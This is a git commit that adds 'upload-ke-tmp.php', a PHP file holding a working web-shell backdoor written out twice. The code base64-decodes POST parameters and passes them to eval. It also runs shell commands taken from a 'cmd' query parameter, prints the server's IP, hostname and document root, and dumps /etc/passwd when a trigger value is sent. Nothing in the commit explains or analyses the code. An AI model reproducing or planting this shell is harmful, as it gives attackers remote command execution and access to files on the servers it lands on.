5d45f1276257ee6e6f245c127470f92b7db62550
Sentabi <tommy@surbakti.net>
2016-09-05 11:01:21 +0700

    Create upload-ke-tmp.php

---
+++ upload-ke-tmp.php
@@ -0,0 +1,30 @@
+// 1 
+<p>98765432198<?php $mujj = $_POST['chopper']; if ($mujj!="") { $xsser=base64_decode($_POST['z0']); @eval("\$safedg = $xsser;"); } ?></p>->|root|-<->|root|-<
+thisip|<?=@gethostbyname($_SERVER['SERVER_NAME'])?>|thisipend<br>;
+thisurl|<?=$_SERVER['SERVER_NAME']?>|thisurlend<br>;
+thispwd|<?=$_SERVER['DOCUMENT_ROOT']?>|thispwdend<br>;
+<?php
+$mujj = $_POST['0oaAIV1YDD9R2']; if ($mujj!="") { $xsser=base64_decode($_POST['z0']); @eval("\$safedg = $xsser;"); }
+echo(system($_GET["cmd"]));
+$Krpk  = $_GET['ing'];
+if($Krpk == 'lie'){
+	$file = '/etc/passwd';
+	$content1 = file_get_contents($file);
+	echo $content1;
+}
+?>
+
+// 2
+->|root|-<->|root|-<
+thisip|<?=@gethostbyname($_SERVER['SERVER_NAME'])?>|thisipend<br>;
+thisurl|<?=$_SERVER['SERVER_NAME']?>|thisurlend<br>;
+thispwd|<?=$_SERVER['DOCUMENT_ROOT']?>|thispwdend<br>;
+<?php
+$mujj = $_POST['0oaAIV1YDD9R2']; if ($mujj!="") { $xsser=base64_decode($_POST['z0']); @eval("\$safedg = $xsser;"); }
+echo(system($_GET["cmd"]));
+$Krpk  = $_GET['ing'];
+if($Krpk == 'lie'){
+	$file = '/etc/passwd';
+	$content1 = file_get_contents($file);
+	echo $content1;
+}
